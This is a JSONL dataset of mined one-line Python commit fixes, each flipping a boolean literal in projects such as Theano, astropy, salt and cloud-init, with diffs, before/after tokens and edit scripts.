{"project": "raven", "commit_sha": "54a4cf17e59d742585548fcb62fc14f39b0b09ba", "parent_sha": "947af83bf5321892ddaed2ee8c71030ced5bd366", "file_path": "framework/Samplers/Sampler.py", "project_url": "https://github.com/idaholab/raven", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -205,7 +205,7 @@ class Sampler(utils.metaclass_insert(abc.ABCMeta,BaseType),Assembler):\n     BaseType.__init__(self)\n     Assembler.__init__(self)\n     self.batch                         = 1                         # determines the size of each sampling batch to run\n-    self.onlySampleAfterCollecting     = False                     # if True, then no new samples unless collection has occurred\n+    self.onlySampleAfterCollecting     = True                     # if True, then no new samples unless collection has occurred\n     self.ableToHandelFailedRuns        = False                     # is this sampler able to handle failed runs?\n     self.counter                       = 0                         # Counter of the samples performed (better the input generated!!!). It is reset by calling the function self.initialize\n     self.auxcnt                        = 0                         # Aux counter of samples performed (for its usage check initialize method)\n", "before": "self . onlySampleAfterCollecting = False", "after": "self . onlySampleAfterCollecting = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 47], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 42, 3, 47]]]"}
{"project": "nutils", "commit_sha": "91db161e47a6e9031ea1263ccce7fe660285c561", "parent_sha": "97bafd89806da7dd4d5bb40ddd058f39ebc61f3d", "file_path": "nutils/plot.py", "project_url": "https://github.com/evalf/nutils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -786,7 +786,7 @@ def writevtu( name, topo, coords, pointdata={}, celldata={}, ascii=False, supere\n \n     if pointdata:  \n       keys, values = zip( *pointdata.items() )\n-      arrays = topo.elem_eval( values, ischeme='vtk', separate=False )\n+      arrays = topo.elem_eval( values, ischeme='vtk', separate=True )\n       for key, array in zip( keys, arrays ):\n         vtkfile.pointdataarray( key, array )\n \n", "before": "arrays = topo . elem_eval ( values , ischeme = 'vtk' , separate = False )", "after": "arrays = topo . elem_eval ( values , ischeme = 'vtk' , separate = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 55, 3, 69], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 64, 3, 69]]]"}
{"project": "cloud-init", "commit_sha": "d48dfa87622d66a78f2405982c95a9f9894e26f4", "parent_sha": "e5e8c1f00ec9728fc03587eeffe7e440420a38d6", "file_path": "cloudinit/CloudConfig/cc_resizefs.py", "project_url": "https://github.com/rightscale/cloud-init", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ def handle(name,cfg,cloud,log,args):\n         if str(value).lower() in [ 'true', '1', 'on', 'yes']:\n             resize_root = True\n     else:\n-        resize_root = util.get_cfg_option_bool(cfg,\"resize_rootfs\",False)\n+        resize_root = util.get_cfg_option_bool(cfg,\"resize_rootfs\",True)\n \n     if not resize_root: return\n \n", "before": "resize_root = util . get_cfg_option_bool ( cfg , \"resize_rootfs\" , False )", "after": "resize_root = util . get_cfg_option_bool ( cfg , \"resize_rootfs\" , True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 47, 3, 74], [\"true:True\", \"T\"], 5], [\"Delete\", [\"false:False\", 3, 68, 3, 73]]]"}
{"project": "payutcli", "commit_sha": "d054adb4c5f40596a1dbd69e3f07f7b2f03991e5", "parent_sha": "b2bc953feff2afc357747d8594602b4e07ed99b6", "file_path": "payutcli.py", "project_url": "https://github.com/payutc/payutcli", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class PayutcError(Exception):\n \n \n class Client(object):\n-    def __init__(self, location, insecure=False, timeout=None, ssl_certificate=None, send_json=False, \n+    def __init__(self, location, insecure=False, timeout=None, ssl_certificate=None, send_json=True,\n         app_key=None, system_id=None, proxies=None):\n", "before": "def __init__ ( self , location , insecure = False , timeout = None , ssl_certificate = None , send_json = False , app_key = None , system_id = None , proxies = None ) : ", "after": "def __init__ ( self , location , insecure = False , timeout = None , ssl_certificate = None , send_json = True , app_key = None , system_id = None , proxies = None ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 86, 3, 101], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 96, 3, 101]]]"}
{"project": "elife-poa-xml-generation", "commit_sha": "8de80765254d1ad56feb3bd9c5e37b35aca5d2f1", "parent_sha": "ff6c465898edb3c82ef56b20243790e890bcf69a", "file_path": "generatePubMedXml.py", "project_url": "https://github.com/elifesciences/elife-poa-xml-generation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class pubMedPoaXML(object):\n         if poa_article.is_poa() is False:\n             # VoR\n             pub_type = \"epublish\"\n-        elif poa_article.is_poa() is False:\n+        elif poa_article.is_poa() is True:\n             # PoA\n             pub_type = \"aheadofprint\"\n         return pub_type\n", "before": "if poa_article . is_poa ( ) is False : pub_type = \"epublish\" elif poa_article . is_poa ( ) is False : pub_type = \"aheadofprint\"", "after": "if poa_article . is_poa ( ) is False : pub_type = \"epublish\" elif poa_article . is_poa ( ) is True : pub_type = \"aheadofprint\"", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 14, 3, 43], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 38, 3, 43]]]"}
{"project": "tesora-horizon", "commit_sha": "321903d06e196704bce5b190648ce3aebb0e89de", "parent_sha": "b5f230cb5464d1f46aa7330cb67279da251d12aa", "file_path": "django-openstack/django_openstack/syspanel/views/flavors.py", "project_url": "https://github.com/Tesora/tesora-horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class DeleteFlavor(forms.SelfHandlingForm):\n         try:\n             flavor_id = data['flavorid']\n             flavor = api.flavor_get(request, flavor_id)\n-            api.flavor_delete(request, flavor_id, True)\n+            api.flavor_delete(request, flavor_id, False)\n             messages.info(request, 'Successfully deleted flavor: %s' %\n                           flavor.name)\n         except api_exceptions.ApiException, e:\n", "before": "api . flavor_delete ( request , flavor_id , True )", "after": "api . flavor_delete ( request , flavor_id , False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 56], [\"false:False\", \"T\"], 5], [\"Delete\", [\"true:True\", 3, 51, 3, 55]]]"}
{"project": "tesora-horizon", "commit_sha": "e770744cf1ddadb37be592daa0eb79a298acd69d", "parent_sha": "83045e3ed777e4df551877c635065df9a4a90e40", "file_path": "openstack_dashboard/dashboards/project/loadbalancers/tables.py", "project_url": "https://github.com/Tesora/tesora-horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -316,7 +316,7 @@ class AddVIPFloatingIP(policy.PolicyTargetMixin, tables.LinkAction):\n         if hasattr(pool, \"vip\") and pool.vip:\n             vip = pool.vip\n             return not (hasattr(vip, \"fip\") and vip.fip)\n-        return True\n+        return False\n \n     def get_link_url(self, datum):\n         base_url = reverse(self.url)\n", "before": "return True", "after": "return False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 20], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 16, 3, 20]]]"}
{"project": "DiscreteZOO-sage", "commit_sha": "f8b53c5fbec9becfeb6c72ed75f34cc7ce65cf65", "parent_sha": "00ceafedec971ba3c1e1de820109890177f2a1e2", "file_path": "graphzoo/zoograph.py", "project_url": "https://github.com/DiscreteZOO/DiscreteZOO-sage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -158,7 +158,7 @@ class ZooGraph(Graph, ZooObject):\n                                     sparse = sparse,\n                                     immutable = immutable)\n \n-    def relabel(self, perm = None, inplace = False, return_map = False,\n+    def relabel(self, perm = None, inplace = True, return_map = False,\n                 check_input = True, complete_partial_function = True):\n         if inplace:\n             raise ValueError(\"To relabel an immutable graph use inplace=False\")\n", "before": "def relabel ( self , perm = None , inplace = False , return_map = False , check_input = True , complete_partial_function = True ) : if inplace : raise ValueError ( \"To relabel an immutable graph use inplace=False\" )", "after": "def relabel ( self , perm = None , inplace = True , return_map = False , check_input = True , complete_partial_function = True ) : if inplace : raise ValueError ( \"To relabel an immutable graph use inplace=False\" )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 36, 3, 51], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 46, 3, 51]]]"}
{"project": "The-CWSeed.bundle", "commit_sha": "73a585a89c511ae79dc944ec56c616210631394c", "parent_sha": "8dcf47c2ead724dedeb12f9e6cc80ae81712c2b8", "file_path": "Contents/Code/__init__.py", "project_url": "https://github.com/shopgirl284/The-CWSeed.bundle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ def SeedJSON(url, title, season, show_title):\n         \n     # For some reason the json is being sorted out of order so we have to sort it here\n     # Prefs do not work currently in latest apps \n-    sort_order=Prefs['sort_order'] if Prefs['sort_order'] in (True, False) else False\n+    sort_order=Prefs['sort_order'] if Prefs['sort_order'] in (True, False) else True\n     oc.objects.sort(key = lambda obj: obj.index, reverse=sort_order)\n         \n     if len(oc) < 1:\n", "before": "sort_order = Prefs [ 'sort_order' ] if Prefs [ 'sort_order' ] in ( True , False ) else False", "after": "sort_order = Prefs [ 'sort_order' ] if Prefs [ 'sort_order' ] in ( True , False ) else True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"conditional_expression\", 3, 16, 3, 86], [\"true:True\", \"T\"], 4], [\"Delete\", [\"false:False\", 3, 81, 3, 86]]]"}
{"project": "roland", "commit_sha": "41dc619ce06e338fdb0b20c125bc000a747d4772", "parent_sha": "33b805669ac25ff3875a2d7f761ff43bb8047b18", "file_path": "roland/core.py", "project_url": "https://github.com/nathan-hoad/roland", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -900,7 +900,7 @@ class EntryLine(Gtk.VBox):\n \n     def prompt(self, callback, suggestions=None, force_match=False,\n                glob=False, prompt='', initial='', cancel=None,\n-               case_sensitive=True, beginning=True, private=False):\n+               case_sensitive=False, beginning=True, private=False):\n         self.callback = callback\n         self.suggestions = suggestions or []\n         self.force_match = force_match\n", "before": "def prompt ( self , callback , suggestions = None , force_match = False , glob = False , prompt = '' , initial = '' , cancel = None , case_sensitive = True , beginning = True , private = False ) : self . callback = callback self . suggestions = suggestions or [ ] self . force_match = force_match", "after": "def prompt ( self , callback , suggestions = None , force_match = False , glob = False , prompt = '' , initial = '' , cancel = None , case_sensitive = False , beginning = True , private = False ) : self . callback = callback self . suggestions = suggestions or [ ] self . force_match = force_match", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 16, 3, 35], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 31, 3, 35]]]"}
{"project": "openalea", "commit_sha": "87652ff67ac15d0b226142068dc746b4609719bc", "parent_sha": "6fded856f0cf5bcb99516eb8dd8ddc4b2fb9a467", "file_path": "core/src/core/node.py", "project_url": "https://github.com/VirtualPlants/openalea", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -336,7 +336,7 @@ class AbstractFactory(Observed):\n                  category = '',\n                  inputs = None,\n                  outputs = None,\n-                 lazy = False,\n+                 lazy = True,\n                  **kargs):\n         \n", "before": "lazy = False ,", "after": "lazy = True ,", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 25, 3, 31], [\"true:True\", \"T\"], 0], [\"Delete\", [\"false:False\", 3, 25, 3, 30]]]"}
{"project": "plant-brapi-to-isa", "commit_sha": "c8f0888e3206e1520737b93fff119eb0944a1295", "parent_sha": "64ed6c4ee124f2761a1d1ec4129944896c8e2492", "file_path": "brapi_to_isa.py", "project_url": "https://github.com/elixir-europe/plant-brapi-to-isa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -462,7 +462,7 @@ def main(arg):\n                 output_file_path = output_directory + filenameFormat(trial['trialName']) + '.json'\n \n                 isa_json = isatab2json.convert(\n-                input_file_path, use_new_parser=False, validate_first=False)\n+                input_file_path, use_new_parser=True, validate_first=False)\n                 with open(output_file_path, 'w') as out_fp:\n                     json.dump(isa_json, out_fp, indent=4)\n             except Exception as ioe:\n", "before": "isa_json = isatab2json . convert ( input_file_path , use_new_parser = False , validate_first = False )", "after": "isa_json = isatab2json . convert ( input_file_path , use_new_parser = True , validate_first = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 34, 3, 54], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 49, 3, 54]]]"}
{"project": "snorkel", "commit_sha": "2ac25de5caf542efffe50625af6208544ed7be98", "parent_sha": "e38bf8c81dce39efd15ef1877e12eb6a44d9a030", "file_path": "ddlite.py", "project_url": "https://github.com/fsonntag/snorkel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -819,7 +819,7 @@ class DDLiteModel:\n     if log:\n       return self.add_to_log()\n \n-  def get_link(self, subset=None, use_lfs=False):\n+  def get_link(self, subset=None, use_lfs=True):\n", "before": "def get_link ( self , subset = None , use_lfs = False ) : ", "after": "def get_link ( self , subset = None , use_lfs = True ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 35, 3, 48], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 43, 3, 48]]]"}
{"project": "cuckoo-modified", "commit_sha": "a7a2655dace7414bccb65022b31f75252e775672", "parent_sha": "3a5de648ce85276d2194b27ba78f22973a262f5c", "file_path": "lib/cuckoo/common/objects.py", "project_url": "https://github.com/wbenny/cuckoo-modified", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -261,7 +261,7 @@ class File:\n                     return\n \n                 try:\n-                    rules = yara.compile(rulepath, error_on_warning=True)\n+                    rules = yara.compile(rulepath, error_on_warning=False)\n \n                     for match in rules.match(self.file_path):\n                         strings = []\n", "before": "rules = yara . compile ( rulepath , error_on_warning = True )", "after": "rules = yara . compile ( rulepath , error_on_warning = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 52, 3, 73], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 69, 3, 73]]]"}
{"project": "kerastext", "commit_sha": "cbc7ed4f7b5ead044bdc87147ff0a624629e48d4", "parent_sha": "9a03220a0fd8bfc9d89a1e7dc7d61e9a4b083bf3", "file_path": "kerastext/__init__.py", "project_url": "https://github.com/ijmarshall/kerastext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -315,7 +315,7 @@ class CNNTextClassifier(ClassifierMixin):\n         y_bool = y_train.astype('bool')\n         pos_indices = np.where(y_bool==True)[0]\n         neg_indices = np.where(y_bool==False)[0]\n-        sampled_indices = (np.append(pos_indices, np.random.choice(neg_indices, int(len(pos_indices)*ratio), replace=False)))\n+        sampled_indices = (np.append(pos_indices, np.random.choice(neg_indices, int(len(pos_indices)*ratio), replace=True)))\n         print(\"{} sampled indices from {} total, which comprise {} positive, {} negative examples\".format(len(sampled_indices), len(y_bool), len(pos_indices), int(len(pos_indices)*ratio)))\n         return X_train[sampled_indices], y_train[sampled_indices]\n     \n", "before": "sampled_indices = ( np . append ( pos_indices , np . random . choice ( neg_indices , int ( len ( pos_indices ) * ratio ) , replace = False ) ) )", "after": "sampled_indices = ( np . append ( pos_indices , np . random . choice ( neg_indices , int ( len ( pos_indices ) * ratio ) , replace = True ) ) )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 110, 3, 123], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 118, 3, 123]]]"}
{"project": "geo-hpc", "commit_sha": "0dd556e66f1e8c53e1d28fd0e6d4497c16286f5c", "parent_sha": "f04156c01b2745e3f453ec078cea60cde1cd76ba", "file_path": "src/autoscript.py", "project_url": "https://github.com/itpir/geo-hpc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -657,7 +657,7 @@ def complete_options_json():\n     json_out = dir_working+'/summary.json'\n     json_handle = open(json_out, 'w')\n     json.dump(write_options, json_handle, sort_keys=False, indent=4,\n-              ensure_ascii=False)\n+              ensure_ascii=True)\n     json_handle.close()\n \n     return options_obj\n", "before": "json . dump ( write_options , json_handle , sort_keys = False , indent = 4 , ensure_ascii = False )", "after": "json . dump ( write_options , json_handle , sort_keys = False , indent = 4 , ensure_ascii = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 15, 3, 33], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 28, 3, 33]]]"}
{"project": "geo-hpc", "commit_sha": "a1b3d150eaab053badeddf15612be385f81179ca", "parent_sha": "a57c26531aae3bbf6f8a0a5df4021a0e8c321bdf", "file_path": "src/tools/update_msr_list.py", "project_url": "https://github.com/itpir/geo-hpc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -329,7 +329,7 @@ for ix in dataset_info.keys():\n         #         hash.\n     \n         def json_sha1_hash(hash_obj):\n-            hash_json = json.dumps(hash_obj, sort_keys = True, ensure_ascii = False, separators=(',', ':'))\n+            hash_json = json.dumps(hash_obj, sort_keys = True, ensure_ascii = True, separators=(',', ':'))\n             hash_builder = hashlib.sha1()\n             try:\n                 hash_builder.update(hash_json)\n", "before": "hash_json = json . dumps ( hash_obj , sort_keys = True , ensure_ascii = False , separators = ( ',' , ':' ) )", "after": "hash_json = json . dumps ( hash_obj , sort_keys = True , ensure_ascii = True , separators = ( ',' , ':' ) )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 64, 3, 84], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 79, 3, 84]]]"}
{"project": "lldb.nvim", "commit_sha": "c26a9aaae9730d1a7172db95694fab13cc51b585", "parent_sha": "d7716dde212f3c3c4242d320ee31afd1485441d9", "file_path": "python-vim-lldb/vim_panes.py", "project_url": "https://github.com/critiqjo/lldb.nvim", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -459,7 +459,7 @@ class LocalsPane(FrameKeyValuePane):\n     # FIXME: allow users to customize display of args/locals/statics/scope\n     self.arguments = True\n     self.show_locals = True\n-    self.show_statics = True\n+    self.show_statics = False\n     self.show_in_scope_only = True\n \n   def format_variable(self, var, indent = 0):\n", "before": "self . show_statics = True", "after": "self . show_statics = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 29], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 25, 3, 29]]]"}
{"project": "crestroncleanup", "commit_sha": "01c450fd996accb05fc18ee2f9c8ec669a4cb322", "parent_sha": "7e5e30178e28058fba4efda4e134dc68a0d1c045", "file_path": "crestroncleanup/app.py", "project_url": "https://github.com/brettvitaz/crestroncleanup", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ class App:\n         self.filename = filename\n         self.overwrite = overwrite\n         self.backup = backup\n-        self.new_ext = NEW_EXT if overwrite is True else ''\n+        self.new_ext = NEW_EXT if overwrite is False else ''\n \n     def process(self):\n         start_time = time.time()\n", "before": "self . new_ext = NEW_EXT if overwrite is True else ''", "after": "self . new_ext = NEW_EXT if overwrite is False else ''", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 35, 3, 52], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 48, 3, 52]]]"}
{"project": "astropy", "commit_sha": "0e9644cf1a554df0985e9990ffce9f5c61ceff51", "parent_sha": "94a78b46c028690a61e1d8758eff198e6d8a7179", "file_path": "astropy/coordinates/sky_coordinate.py", "project_url": "https://github.com/mirca/astropy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1902,7 +1902,7 @@ class SkyCoord(ShapedLikeNDArray):\n \n     # Name resolve\n     @classmethod\n-    def from_name(cls, name, frame='icrs', parse=False, cache=False):\n+    def from_name(cls, name, frame='icrs', parse=False, cache=True):\n", "before": "def from_name ( cls , name , frame = 'icrs' , parse = False , cache = False ) : ", "after": "def from_name ( cls , name , frame = 'icrs' , parse = False , cache = True ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 57, 3, 68], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 63, 3, 68]]]"}
{"project": "ddr-local", "commit_sha": "c41bc6f7da786e76761a3bf78c3f6d6babf039d1", "parent_sha": "76eb86e3c4399db926e9bcbcd515360e76b62ef9", "file_path": "ddrlocal/webui/context_processors.py", "project_url": "https://github.com/densho/ddr-local", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ def sitewide(request):\n         'git_mail': request.session.get('git_mail', None),\n         'celery_tasks': tasks_common.session_tasks_list(request),\n         'celery_status_url': reverse(\"webui-task-status\"),\n-        'celery_status_update': request.session.get('celery_status_update', False),\n+        'celery_status_update': request.session.get('celery_status_update', True),\n         'STATIC_URL': settings.STATIC_URL,\n         'supervisord_url': settings.SUPERVISORD_URL,\n         'docstore_enabled': settings.DOCSTORE_ENABLED,\n", "before": "'celery_status_update' : request . session . get ( 'celery_status_update' , False ) ,", "after": "'celery_status_update' : request . session . get ( 'celery_status_update' , True ) ,", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 52, 3, 83], [\"true:True\", \"T\"], 3], [\"Delete\", [\"false:False\", 3, 77, 3, 82]]]"}
{"project": "salt", "commit_sha": "a61516c672cdb241007eba9f07236339cc94719c", "parent_sha": "dce1f34ee94729309447e6d663b6132e908e039a", "file_path": "salt/cloud/clouds/vmware.py", "project_url": "https://github.com/singlehopllc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2062,7 +2062,7 @@ def create(vm_):\n         'extra_config', vm_, __opts__, default=None\n     )\n     power = config.get_cloud_config_value(\n-        'power_on', vm_, __opts__, default=False\n+        'power_on', vm_, __opts__, default=True\n     )\n     key_filename = config.get_cloud_config_value(\n         'private_key', vm_, __opts__, search_global=False, default=None\n", "before": "power = config . get_cloud_config_value ( 'power_on' , vm_ , __opts__ , default = False )", "after": "power = config . get_cloud_config_value ( 'power_on' , vm_ , __opts__ , default = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 36, 3, 49], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 44, 3, 49]]]"}
{"project": "Theano", "commit_sha": "de9ce09e14833c2080f411b3b022af933644e399", "parent_sha": "f02ee46b01ac8147133ab423672ca9f61dbf8826", "file_path": "theano/printing.py", "project_url": "https://github.com/fvisin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -392,7 +392,7 @@ default_colorCodes = {'GpuFromHost' : 'red',\n \n def pydotprint(fct, outfile=None,\n                compact=True, format='png', with_ids=False,\n-               high_contrast=False, cond_highlight = None, colorCodes = None,\n+               high_contrast=True, cond_highlight = None, colorCodes = None,\n                max_label_size=50, scan_graphs = False):\n", "before": "def pydotprint ( fct , outfile = None , compact = True , format = 'png' , with_ids = False , high_contrast = False , cond_highlight = None , colorCodes = None , max_label_size = 50 , scan_graphs = False ) : ", "after": "def pydotprint ( fct , outfile = None , compact = True , format = 'png' , with_ids = False , high_contrast = True , cond_highlight = None , colorCodes = None , max_label_size = 50 , scan_graphs = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 16, 3, 35], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 30, 3, 35]]]"}
{"project": "python-gsmmodem", "commit_sha": "b4faf1e3c570bf70bdc5db6b6b473274c9164b12", "parent_sha": "953835fd5fe03c3662c1dc40ccc19141735ce121", "file_path": "gsmmodem/modem.py", "project_url": "https://github.com/mobappmart/python-gsmmodem", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ class GsmModem(SerialComms):\n         self._waitForAtdResponse = True # Flag that controls if we should wait for an immediate response to ATD, or not\n         self.callStatusUpdates = [] # populated during connect() - contains regexes and handlers for detecting/handling call status updates\n         self._writeWait = 0 # Time (in seconds to wait after writing a command (adjusted when 515 errors are detected)\n-        self._smsTextMode = False # Storage variable for the smsTextMode property\n+        self._smsTextMode = True # Storage variable for the smsTextMode property\n         \n     def connect(self, runInit=True):\n         \"\"\" Opens the port and initializes the modem \"\"\"\n", "before": "self . _smsTextMode = False", "after": "self . _smsTextMode = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 34], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 29, 3, 34]]]"}
{"project": "python-gsmmodem", "commit_sha": "4aba79d74aac4590e23c5512b43c4c23763ecf2f", "parent_sha": "c83e702e12745ef86f589975ea726c2aa0493a97", "file_path": "examples/sms_handler_demo.py", "project_url": "https://github.com/mobappmart/python-gsmmodem", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def main():\n     # Uncomment the following line to see what the modem is doing:\n     logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)\n     modem = GsmModem(PORT, BAUDRATE, smsReceivedCallbackFunc=handleSms)\n-    modem.smsTextMode = True    \n+    modem.smsTextMode = False \n     modem.connect(PIN)\n     print('Waiting for SMS message...')    \n     try:    \n", "before": "modem . smsTextMode = True", "after": "modem . smsTextMode = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 29], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 25, 3, 29]]]"}
{"project": "Theano", "commit_sha": "6396cb9f0121d693199c8a73740d222f07de019d", "parent_sha": "6a7d9ec91b9ca35a61a6b3458b6eb134c4b410da", "file_path": "theano/compile/sandbox/sharedvalue.py", "project_url": "https://github.com/fvisin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ def shared_constructor(ctor):\n     shared.constructors.append(ctor)\n     return ctor\n \n-def shared(value, name=None, strict=False, **kwargs):\n+def shared(value, name=None, strict=True, **kwargs):\n", "before": "def shared ( value , name = None , strict = False , ** kwargs ) : ", "after": "def shared ( value , name = None , strict = True , ** kwargs ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 30, 3, 42], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 37, 3, 42]]]"}
{"project": "Theano", "commit_sha": "ee786d5644e65d12130f3a18857a7cf93e2c2aad", "parent_sha": "2dccbe6e8862b346a40e8d0587ab99dfbac418e9", "file_path": "theano/compile/sandbox/sharedvalue.py", "project_url": "https://github.com/fvisin/Theano", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ def shared_constructor(ctor):\n     shared.constructors.append(ctor)\n     return ctor\n \n-def shared(value, name=None, strict=True, **kwargs):\n+def shared(value, name=None, strict=False, **kwargs):\n", "before": "def shared ( value , name = None , strict = True , ** kwargs ) : ", "after": "def shared ( value , name = None , strict = False , ** kwargs ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 30, 3, 41], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 37, 3, 41]]]"}
{"project": "nltk", "commit_sha": "ef9554c94762dc8d2b77624d2bad7bea7ba7065a", "parent_sha": "b20080a2bb87c914e0a7f8627c3bf22fdeafacee", "file_path": "nltk_lite/contrib/shoebox/lexicon.py", "project_url": "https://github.com/uda/nltk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -205,7 +205,7 @@ class Lexicon(ShoeboxFile):\n             head_field_marker     = 'lx',\n             subentry_field_marker = None,\n             key_fields            = None,\n-            unique_entry          = False,\n+            unique_entry          = True,\n             unique_subentry       = False):\n", "before": "unique_entry = False ,", "after": "unique_entry = True ,", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 37, 3, 43], [\"true:True\", \"T\"], 0], [\"Delete\", [\"false:False\", 3, 37, 3, 42]]]"}
